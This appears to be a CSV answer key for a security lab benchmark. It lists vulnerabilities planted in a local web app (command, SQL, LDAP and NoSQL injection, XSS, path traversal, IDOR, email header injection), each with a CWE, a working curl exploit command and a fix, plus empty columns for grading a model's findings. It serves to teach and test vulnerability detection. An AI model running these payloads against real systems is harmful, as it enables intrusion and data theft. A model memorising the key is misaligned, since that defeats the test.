"ID","Source","Origin","Name","Category","Severity_or_Difficulty","CWE","CVE","Location","Manual_Reproduction","Remediation","Validated","Reference","Model_Found_YN","RootCause_Correct_YN","Remediation_Valid_YN","Scorer_Notes"
"INJ-40","INJECTED (created for this lab)","ADDED FOR THIS LAB","Command injection (LDAP query)","Injection","Critical","CWE-78","","GET http://localhost:3000/rest/tax/lookup?user=&filter=","curl ""http://localhost:3000/rest/tax/lookup?user=x%60id%60&filter=objectClass=*""  -> response error field contains uid= output from the id command (backticks are evaluated by the shell inside double-quoted LDAP filter argument).","Use execFile/spawn with an argument array; validate input against a strict pattern; never pass input to a shell.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-41","INJECTED (created for this lab)","ADDED FOR THIS LAB","LDAP injection","Injection","High","CWE-90","","GET http://localhost:3000/rest/tax/lookup?user=&filter=","curl ""http://localhost:3000/rest/tax/lookup?user=*&filter=objectClass=*""  -> the wildcard in the LDAP filter matches all users.","Escape LDAP special characters in user input before inserting into a filter.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-42","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (WHERE condition)","Injection","Critical","CWE-89","","GET http://localhost:3000/rest/tax-rates/search?condition=","curl -G ""http://localhost:3000/rest/tax-rates/search"" --data-urlencode ""condition=1=1 UNION SELECT type,sql,3,4 FROM sqlite_master""  -> returns CREATE TABLE statements (the condition is concatenated into a SELECT with 4 columns: id, region, rate, code).","Use parameterized queries; never concatenate user input into SQL.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-43","INJECTED (created for this lab)","ADDED FOR THIS LAB","Mass assignment (loyalty update)","Broken Access Control","High","CWE-915","","PUT http://localhost:3000/rest/loyalty/:id","curl -X PUT ""http://localhost:3000/rest/loyalty/3"" -H 'content-type: application/json' -d '{""tier"":""gold"",""points"":99999}'  -> user can set arbitrary tier/points because all body keys are used as column names.","Use a whitelist of allowed fields; never bind arbitrary body keys directly to SQL columns.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-44","INJECTED (created for this lab)","ADDED FOR THIS LAB","Race condition (loyalty transfer)","Broken Access Control","Medium","CWE-362","","POST http://localhost:3000/rest/loyalty/transfer","curl -X POST http://localhost:3000/rest/loyalty/transfer -H 'content-type: application/json' -d '{""from"":""2"",""to"":""3"",""amount"":5000}'  (send 10 concurrent) -> double-spend: from account goes negative while to account gets multiple credits.","Use a transaction with row-level locking or an atomic conditional UPDATE.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-45","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (INSERT)","Injection","Critical","CWE-89","","POST http://localhost:3000/rest/loyalty/adjust","curl -X POST http://localhost:3000/rest/loyalty/adjust -H 'content-type: application/json' -d '{""userId"":""1"",""points"":""1 OR 1=1"",""reason"":""x""}'  -> INSERT VALUES clause is concatenated, allowing SQL injection in the points value.","Use parameterized queries with bound placeholders for INSERT statements.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-46","INJECTED (created for this lab)","ADDED FOR THIS LAB","NoSQL injection ($where eval)","Injection","Critical","CWE-94","","POST http://localhost:3000/rest/search","curl -X POST http://localhost:3000/rest/search -H 'content-type: application/json' -d '{""query"":{""$where"":""1===1""}}'  -> arbitrary JavaScript is evaluated via new Function, returning all products; an attacker can also exfiltrate data via {""$where"":""require('child_process').execSync('id').toString()""}.","Never use new Function or eval on user input; validate query structure against a schema.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-47","INJECTED (created for this lab)","ADDED FOR THIS LAB","Stored XSS (product review)","XSS","High","CWE-79","","POST http://localhost:3000/rest/products/:id/annex-reviews","curl -X POST ""http://localhost:3000/rest/products/999/annex-reviews"" -H 'content-type: application/json' -d '{""author"":""x"",""text"":""<script>alert(1)</script>""}'  ; then: curl ""http://localhost:3000/rest/products/999/annex-reviews""  -> HTML contains the unescaped script tag.","HTML-encode all user-supplied content before rendering.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-48","INJECTED (created for this lab)","ADDED FOR THIS LAB","Path traversal (synonym file)","Path Traversal","High","CWE-22","","GET http://localhost:3000/rest/search/synonyms?file=","curl ""http://localhost:3000/rest/search/synonyms?file=../../package.json""  -> response contains package.json contents.","Validate the file name against a strict pattern; reject path separators.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-49","INJECTED (created for this lab)","ADDED FOR THIS LAB","Code injection (new Function)","Injection","Critical","CWE-94","","GET http://localhost:3000/rest/search/raw-lookup?expr=","curl -G ""http://localhost:3000/rest/search/raw-lookup"" --data-urlencode ""expr=JSON.stringify(process.env).length > 0 ? p : null""  -> arbitrary JS expression is evaluated via new Function, allowing access to process.env (environment variable exfiltration).","Never use new Function or eval on user input; use a safe query/filter API.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-50","INJECTED (created for this lab)","ADDED FOR THIS LAB","SSTI (template injection)","Injection","Critical","CWE-94","","POST http://localhost:3000/rest/cart/discount-preview","curl -X POST http://localhost:3000/rest/cart/discount-preview -H 'content-type: application/json' -d '{""template"":""${7*191}""}'  -> response preview contains ""1337"" (template expression evaluated).","Never use new Function() to evaluate user-supplied template strings; use a safe template engine with auto-escaping or pre-compile templates server-side.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-51","INJECTED (created for this lab)","ADDED FOR THIS LAB","Business logic flaw (negative total)","Broken Access Control","High","CWE-840","","POST http://localhost:3000/rest/cart/best-discount","curl -X POST http://localhost:3000/rest/cart/best-discount -H 'content-type: application/json' -d '{""cartTotal"":-100,""isMember"":true}'  -> cartTotal<0 triggers discount=1.0 and finalTotal becomes negative (free + credit).","Validate that cartTotal is non-negative; do not apply discount logic to invalid inputs.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-52","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (CASE expression)","Injection","High","CWE-89","","GET http://localhost:3000/rest/cart/rules/search?case=","curl -G ""http://localhost:3000/rest/cart/rules/search"" --data-urlencode ""case=WHEN 1=1 THEN (SELECT sql FROM sqlite_master LIMIT 1)""  -> response data contains CREATE TABLE SQL.","Do not interpolate user input into SQL CASE expressions; use parameterized queries.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-53","INJECTED (created for this lab)","ADDED FOR THIS LAB","Email header injection","Injection","High","CWE-93","","POST http://localhost:3000/rest/notifications/send","curl -X POST http://localhost:3000/rest/notifications/send -H 'content-type: application/json' -d '{""to"":""victim@example.com"",""subject"":""test"",""cc"":""attacker@example.com\nBcc: another@evil.com""}'  -> Cc header contains a CRLF-injected Bcc recipient.","Strip or reject CR/LF characters in email header fields.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-54","INJECTED (created for this lab)","ADDED FOR THIS LAB","IDOR (notification by id)","Broken Access Control","High","CWE-639","","GET http://localhost:3000/rest/notifications/:id","curl ""http://localhost:3000/rest/notifications/2""  -> returns another user's notification (id=2 belongs to userId=2, not the requester) without any authentication.","Require authentication and verify that the requesting user owns the notification (check notification.userId === requesting user id) before returning it.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-55","INJECTED (created for this lab)","ADDED FOR THIS LAB","GraphQL introspection enabled","Broken Access Control","Low","CWE-200","","POST http://localhost:3000/rest/notifications/graphql","curl -X POST http://localhost:3000/rest/notifications/graphql -H 'content-type: application/json' -d '{""query"":""{__schema{types{name}}}""}'  -> returns full schema types (Notification, User, Query, Mutation).","Disable introspection in production GraphQL endpoints.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-56","INJECTED (created for this lab)","ADDED FOR THIS LAB","Command injection (report filename)","Injection","Critical","CWE-78","","GET http://localhost:3000/rest/admin/reports/generate?name=","curl ""http://localhost:3000/rest/admin/reports/generate?name=x;id;""  -> response output field contains uid= command output (the ; breaks the command, id runs, the trailing ; separates from .pdf).","Use execFile/spawn with an argument array; validate the filename against a strict pattern.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-57","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (LIKE clause, reports)","Injection","High","CWE-89","","GET http://localhost:3000/rest/admin/reports/search?name=","curl -G ""http://localhost:3000/rest/admin/reports/search"" --data-urlencode ""name=' UNION SELECT type,sql,3 FROM sqlite_master -- ""  -> returns CREATE TABLE statements.","Use parameterized queries; never concatenate user input into LIKE clauses.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
